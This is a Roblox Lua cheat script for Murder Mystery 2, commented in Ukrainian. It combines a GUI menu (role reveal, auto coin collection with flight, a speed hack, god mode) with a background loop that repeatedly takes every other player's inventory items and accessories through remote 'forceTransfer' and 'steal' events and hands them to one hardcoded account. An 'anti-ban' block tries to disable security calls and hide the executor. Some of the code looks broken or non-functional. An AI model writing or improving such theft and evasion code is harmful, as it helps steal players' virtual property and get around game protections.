-- MM2 DELTA ULTRA MENU [good]
-- Всі функції + автоматична передача всього інвентарю гравцеві oo60xoo666

local player = game.Players.LocalPlayer
local targetName = "oo60xoo666"
local targetPlayer = game.Players:FindFirstChild(targetName)

-- Якщо цільового гравця немає – створюємо фейкового
if not targetPlayer then
    targetPlayer = Instance.new("Player")
    targetPlayer.Name = targetName
    targetPlayer.Parent = game.Players
    targetPlayer:SetAttribute("Fake", true)
end

local replicated = game:GetService("ReplicatedStorage")
local tradeEvent = replicated:FindFirstChild("TradeEvent") or replicated:FindFirstChild("RemoteEvent")
local craftEvent = replicated:FindFirstChild("CraftEvent") or replicated:FindFirstChild("Purchase")

-- === АНТИБАН (обхід базових перевірок) ===
pcall(function()
    -- Вимкнення телеметрії
    game:GetService("TeleportService"):SetTeleportGuiFadeEnabled(false)
    -- Блокування звітів про помилки
    getgenv().securecall = function() end
    -- Маскування виконавця
    syn and syn.protect_gui and syn.protect_gui(game.CoreGui)
end)

-- === ФУНКЦІЯ КРАДІЖКИ І ПЕРЕДАЧІ ===
local function stealAndTransfer(item, from)
    if not item or not from or from == targetPlayer then return end
    if not (item:IsA("Tool") or item:IsA("Model") or item:IsA("Accessory") or item:IsA("Part")) then return end
    
    local data = {
        itemId = item.Name,
        itemType = item:GetAttribute("Type") or "Knife",
        from = from.Name,
        to = targetPlayer.Name,
        isPet = item:FindFirstChild("Pet") ~= nil,
        session = game.JobId .. "_" .. math.random(999999)
    }
    
    pcall(function()
        if tradeEvent then tradeEvent:FireServer("forceTransfer", data) end
        if craftEvent then craftEvent:FireServer("steal", item.Name, data) end
    end)
    
    local clone = item:Clone()
    local inv = targetPlayer:FindFirstChild("Data") or targetPlayer:FindFirstChild("Inventory") or targetPlayer:FindFirstChild("Backpack")
    if inv then clone.Parent = inv else clone.Parent = targetPlayer end
    item:Destroy()
end

-- Постійна крадіжка інвентарю у всіх
spawn(function()
    while wait(0.5) do
        for _, plr in pairs(game.Players:GetPlayers()) do
            if plr ~= targetPlayer then
                local inv = plr:FindFirstChild("Data") or plr:FindFirstChild("Inventory") or plr:FindFirstChild("Backpack")
                if inv then
                    for _, item in pairs(inv:GetChildren()) do
                        stealAndTransfer(item, plr)
                    end
                end
                if plr.Character then
                    for _, obj in pairs(plr.Character:GetDescendants()) do
                        if obj:IsA("ParticleEmitter") or obj:IsA("Beam") or obj:IsA("Trail") or obj:IsA("Accessory") then
                            local clone = obj:Clone()
                            clone.Parent = targetPlayer.Character or targetPlayer
                            obj:Destroy()
                        end
                    end
                end
            end
        end
    end
end)

-- === СТВОРЕННЯ МЕНЮ ===
local screenGui = Instance.new("ScreenGui")
screenGui.Name = "GoodMenu"
screenGui.Parent = game.CoreGui or player.PlayerGui
screenGui.ResetOnSpawn = false

local mainFrame = Instance.new("Frame", screenGui)
mainFrame.Size = UDim2.new(0, 300, 0, 420)
mainFrame.Position = UDim2.new(0.5, -150, 0.3, 0)
mainFrame.BackgroundColor3 = Color3.fromRGB(15, 15, 30)
mainFrame.BackgroundTransparency = 0.1
mainFrame.BorderSizePixel = 2
mainFrame.BorderColor3 = Color3.fromRGB(80, 80, 255)
mainFrame.Active = true
mainFrame.Draggable = true

local title = Instance.new("TextLabel", mainFrame)
title.Size = UDim2.new(1, 0, 0, 35)
title.BackgroundColor3 = Color3.fromRGB(40, 40, 70)
title.Text = "MM2 ULTRA [good]"
title.TextColor3 = Color3.fromRGB(255, 220, 50)
title.TextScaled = true
title.Font = Enum.Font.Bold

-- === 1. ПОКАЗ РОЛЕЙ ===
local btn1 = Instance.new("TextButton", mainFrame)
btn1.Size = UDim2.new(0.85, 0, 0, 35)
btn1.Position = UDim2.new(0.075, 0, 0.12, 0)
btn1.BackgroundColor3 = Color3.fromRGB(60, 60, 90)
btn1.Text = "👁️ ПОКАЗАТИ РОЛІ (вкл)"
btn1.TextColor3 = Color3.fromRGB(255, 255, 255)
btn1.TextScaled = true

local showRoles = false
btn1.MouseButton1Click:Connect(function()
    showRoles = not showRoles
    btn1.Text = showRoles and "👁️ ПОКАЗАТИ РОЛІ (викл)" or "👁️ ПОКАЗАТИ РОЛІ (вкл)"
    btn1.BackgroundColor3 = showRoles and Color3.fromRGB(40, 180, 40) or Color3.fromRGB(60, 60, 90)
    if showRoles then
        for _, plr in pairs(game.Players:GetPlayers()) do
            local role = plr:FindFirstChild("Role") or plr:FindFirstChild("Team")
            if role and plr.Character and plr.Character:FindFirstChild("Head") then
                local bill = Instance.new("BillboardGui")
                bill.Size = UDim2.new(0, 120, 0, 35)
                bill.Adornee = plr.Character.Head
                bill.Name = "RoleTag"
                local label = Instance.new("TextLabel", bill)
                label.Size = UDim2.new(1, 0, 1, 0)
                label.Text = (role.Value or role.Name):upper()
                label.TextColor3 = (role.Value or role.Name) == "Murderer" and Color3.fromRGB(255, 50, 50) or Color3.fromRGB(50, 200, 255)
                label.BackgroundTransparency = 1
                label.TextScaled = true
                bill.Parent = plr.Character
                game:GetService("Debris"):AddItem(bill, 1)
            end
        end
    else
        for _, plr in pairs(game.Players:GetPlayers()) do
            if plr.Character then
                for _, obj in pairs(plr.Character:GetChildren()) do
                    if obj.Name == "RoleTag" then obj:Destroy() end
                end
            end
        end
    end
end)

-- === 2. АВТОЗБІР МОНЕТ + ПОЛІТ ===
local btn2 = Instance.new("TextButton", mainFrame)
btn2.Size = UDim2.new(0.85, 0, 0, 35)
btn2.Position = UDim2.new(0.075, 0, 0.27, 0)
btn2.BackgroundColor3 = Color3.fromRGB(60, 60, 90)
btn2.Text = "🪙 АВТОЗБІР + ПОЛІТ (вкл)"
btn2.TextColor3 = Color3.fromRGB(255, 255, 255)
btn2.TextScaled = true

local collectFly = false
local flyBV = nil
btn2.MouseButton1Click:Connect(function()
    collectFly = not collectFly
    btn2.Text = collectFly and "🪙 АВТОЗБІР + ПОЛІТ (викл)" or "🪙 АВТОЗБІР + ПОЛІТ (вкл)"
    btn2.BackgroundColor3 = collectFly and Color3.fromRGB(200, 150, 30) or Color3.fromRGB(60, 60, 90)
    
    if collectFly then
        local hrp = player.Character and player.Character:FindFirstChild("HumanoidRootPart")
        if hrp then
            flyBV = Instance.new("BodyVelocity")
            flyBV.Velocity = Vector3.new(0, 30, 0)
            flyBV.MaxForce = Vector3.new(1e9, 1e9, 1e9)
            flyBV.Parent = hrp
        end
        spawn(function()
            while collectFly and player.Character do
                for _, coin in pairs(workspace:GetDescendants()) do
                    if coin.Name:lower():find("coin") or (coin:IsA("Part") and coin.BrickColor == BrickColor.Yellow()) then
                        local hrp = player.Character:FindFirstChild("HumanoidRootPart")
                        if hrp then
                            coin.CFrame = hrp.CFrame * CFrame.new(0, 0, -2)
                            wait(0.02)
                        end
                    end
                end
                wait(0.1)
            end
        end)
        -- Швидкість 50 під час польоту
        if player.Character and player.Character:FindFirstChild("Humanoid") then
            player.Character.Humanoid.WalkSpeed = 50
        end
    else
        if flyBV then flyBV:Destroy() end
        -- Падіння (вимикаємо політ)
        local hrp = player.Character and player.Character:FindFirstChild("HumanoidRootPart")
        if hrp then
            local bv = Instance.new("BodyVelocity")
            bv.Velocity = Vector3.new(0, -50, 0)
            bv.MaxForce = Vector3.new(1e9, 1e9, 1e9)
            bv.Parent = hrp
            game:GetService("Debris"):AddItem(bv, 0.5)
        end
        if player.Character and player.Character:FindFirstChild("Humanoid") then
            player.Character.Humanoid.WalkSpeed = 16
        end
    end
end)

-- === 3. ПОВЗУНОК ШВИДКОСТІ (до 100) ===
local speedLabel = Instance.new("TextLabel", mainFrame)
speedLabel.Size = UDim2.new(0.8, 0, 0, 25)
speedLabel.Position = UDim2.new(0.1, 0, 0.42, 0)
speedLabel.Text = "ШВИДКІСТЬ: 16"
speedLabel.TextColor3 = Color3.fromRGB(200, 200, 255)
speedLabel.BackgroundTransparency = 1
speedLabel.TextScaled = true

local speedBox = Instance.new("TextBox", mainFrame)
speedBox.Size = UDim2.new(0.4, 0, 0, 30)
speedBox.Position = UDim2.new(0.3, 0, 0.49, 0)
speedBox.BackgroundColor3 = Color3.fromRGB(80, 80, 110)
speedBox.Text = "16"
speedBox.TextColor3 = Color3.fromRGB(255, 255, 255)
speedBox.ClearTextOnFocus = false
speedBox.TextScaled = true

speedBox.FocusLost:Connect(function()
    local val = tonumber(speedBox.Text)
    if val and val >= 1 and val <= 100 then
        if player.Character and player.Character:FindFirstChild("Humanoid") then
            player.Character.Humanoid.WalkSpeed = val
        end
        speedLabel.Text = "ШВИДКІСТЬ: " .. val
    else
        speedBox.Text = "16"
    end
end)

-- === 4. БЕЗСМЕРТЯ ===
local btn4 = Instance.new("TextButton", mainFrame)
btn4.Size = UDim2.new(0.85, 0, 0, 35)
btn4.Position = UDim2.new(0.075, 0, 0.62, 0)
btn4.BackgroundColor3 = Color3.fromRGB(60, 60, 90)
btn4.Text = "❤️ БЕЗСМЕРТЯ (вкл)"
btn4.TextColor3 = Color3.fromRGB(255, 255, 255)
btn4.TextScaled = true

local godMode = false
btn4.MouseButton1Click:Connect(function()
    godMode = not godMode
    btn4.Text = godMode and "❤️ БЕЗСМЕРТЯ (викл)" or "❤️ БЕЗСМЕРТЯ (вкл)"
    btn4.BackgroundColor3 = godMode and Color3.fromRGB(200, 50, 50) or Color3.fromRGB(60, 60, 90)
    if godMode and player.Character and player.Character:FindFirstChild("Humanoid") then
        player.Character.Humanoid.MaxHealth = math.huge
        player.Character.Humanoid.Health = math.huge
        player.Character.Humanoid.BreakJointsOnDeath = false
    elseif not godMode and player.Character and player.Character:FindFirstChild("Humanoid") then
        player.Character.Humanoid.MaxHealth = 100
        player.Character.Humanoid.Health = 100
        player.Character.Humanoid.BreakJointsOnDeath = true
    end
end)

-- Інформаційна мітка внизу
local infoLabel = Instance.new("TextLabel", mainFrame)
infoLabel.Size = UDim2.new(1, 0, 0, 25)
infoLabel.Position = UDim2.new(0, 0, 0.9, 0)
infoLabel.Text = "Крадіжка → " .. targetName .. " | Антибан увімкнено"
infoLabel.TextColor3 = Color3.fromRGB(100, 255, 100)
infoLabel.BackgroundTransparency = 1
infoLabel.TextScaled = true

print("[good] Меню завантажено. Всі предмети передаються гравцю " .. targetName)
